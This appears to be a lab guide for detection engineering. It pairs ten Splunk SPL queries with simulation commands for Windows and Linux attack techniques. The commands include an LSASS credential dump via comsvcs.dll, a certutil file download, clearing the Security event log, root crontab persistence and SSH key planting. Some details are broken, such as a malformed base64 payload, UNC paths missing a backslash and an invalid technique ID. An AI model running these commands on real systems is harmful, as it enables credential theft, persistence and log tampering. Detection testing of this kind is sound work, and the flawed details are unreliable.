# 10 Splunk SPL Queries & Attack Commands for Step 1.2 & 1.3

## Rule 01 — Suspicious PowerShell Execution (`T1059.001`)
* **Splunk Query:**
  ```spl
  index=win_logs (EventCode=4104 OR EventCode=1) ("-enc" OR "-EncodedCommand" OR "FromBase64String" OR "IEX" OR "DownloadString") | table _time, host, User, EventCode, CommandLine, ScriptBlockText
  ```
* **Attack Command (Run in Admin PowerShell on Windows `192.168.120.150`):**
  ```powershell
  powershell.exe -EncodedCommand VwByAGkAdAC0ASABvAHMAdAAgACcAVABlAHMAdAAnAA==
  ```

## Rule 02 — Scheduled Task Creation (`T1053.005`)
* **Splunk Query:**
  ```spl
  index=win_logs (EventCode=4698 OR (EventCode=1 Image="*\schtasks.exe" CommandLine="*/create*")) | table _time, host, User, EventCode, TaskName, CommandLine
  ```
* **Attack Command:**
  ```powershell
  schtasks /create /tn "UpdaterTask" /tr "cmd.exe /c whoami" /sc daily /st 12:00 /f
  ```

## Rule 03 — New Windows Service Created (`T1543.003`)
* **Splunk Query:**
  ```spl
  index=win_logs (EventCode=7045 OR (EventCode=1 Image="*\sc.exe" CommandLine="*create*")) | table _time, host, User, EventCode, ServiceName, ImagePath, CommandLine
  ```
* **Attack Command:**
  ```powershell
  sc.exe create "TestBadSvc" binPath= "cmd.exe /c echo test"
  ```

## Rule 04 — LSASS Memory Credential Dumping (`T1003.001`)
* **Splunk Query:**
  ```spl
  index=win_logs (EventCode=10 TargetImage="*\lsass.exe" GrantedAccess IN ("0x1fffff","0x1010","0x1410","0x143a")) OR (EventCode=1 CommandLine="*lsass*" OR CommandLine="*comsvcs.dll*MiniDump*") | table _time, host, User, SourceImage, TargetImage, GrantedAccess, CommandLine
  ```
* **Attack Command:**
  ```powershell
  rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
  ```

## Rule 05 — Brute Force Followed by Success (Correlation) (`T1110`)
* **Splunk Query:**
  ```spl
  index=win_logs EventCode IN (4625, 4624) | bucket _time span=10m | stats count(eval(EventCode=4625)) as Failed_Logons, count(eval(EventCode=4624)) as Success_Logons by _time, TargetUserName, host | where Failed_Logons >= 3 AND Success_Logons >= 1
  ```
* **Attack Command:**
  ```powershell
  1..3 | % { net use \127.0.0.1\ipc$ /user:Administrator WrongPass123 }; net use \127.0.0.1\ipc$
  ```

## Rule 06 — Clearing Windows Event Logs (`T1685.005`)
* **Splunk Query:**
  ```spl
  index=win_logs (EventCode=1102 OR EventCode=104 OR (EventCode=1 Image="*\wevtutil.exe" CommandLine="* cl *")) | table _time, host, User, EventCode, CommandLine
  ```
* **Attack Command:**
  ```powershell
  wevtutil.exe cl Security
  ```

## Rule 07 — Rundll32 Proxy Execution (`T1218.011`)
* **Splunk Query:**
  ```spl
  index=win_logs EventCode=1 Image="*\rundll32.exe" (CommandLine="*javascript:*" OR CommandLine="*http*" OR CommandLine="*comsvcs.dll*" OR CommandLine="*\AppData\*" OR CommandLine="*\Temp\*") | table _time, host, User, ParentImage, Image, CommandLine
  ```
* **Attack Command:**
  ```powershell
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('test')
  ```

## Rule 08 — Ingress Tool Transfer (`T1105`)
* **Splunk Query:**
  ```spl
  index=win_logs EventCode=1 (Image="*\certutil.exe" (CommandLine="*-urlcache*" OR CommandLine="*-split*")) OR (Image="*\curl.exe" CommandLine="*http*") | table _time, host, User, Image, CommandLine
  ```
* **Attack Command:**
  ```powershell
  certutil.exe -urlcache -split -f http://192.168.120.151/index.html C:\Windows\Temp\test.html
  ```

## Rule 09 — Linux Cron Job Persistence (`T1053.003`)
* **Splunk Query:**
  ```spl
  index=linux_logs sourcetype="linux:audit" key="cron_persistence" type=SYSCALL | table _time, host, uid, auid, exe, comm, key, _raw
  ```
* **Attack Command (Run in SSH on Linux `192.168.120.151`):**
  ```bash
  echo "* * * * * root /bin/sh -c 'id > /tmp/pwn'" | sudo tee -a /etc/crontab
  ```

## Rule 10 — Linux SSH Authorized Keys Modification (`T1098.004`)
* **Splunk Query:**
  ```spl
  index=linux_logs sourcetype="linux:audit" key="ssh_keys" type=SYSCALL | table _time, host, uid, auid, exe, comm, key, _raw
  ```
* **Attack Command:**
  ```bash
  mkdir -p ~/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... test@attack" >> ~/.ssh/authorized_keys
  ```
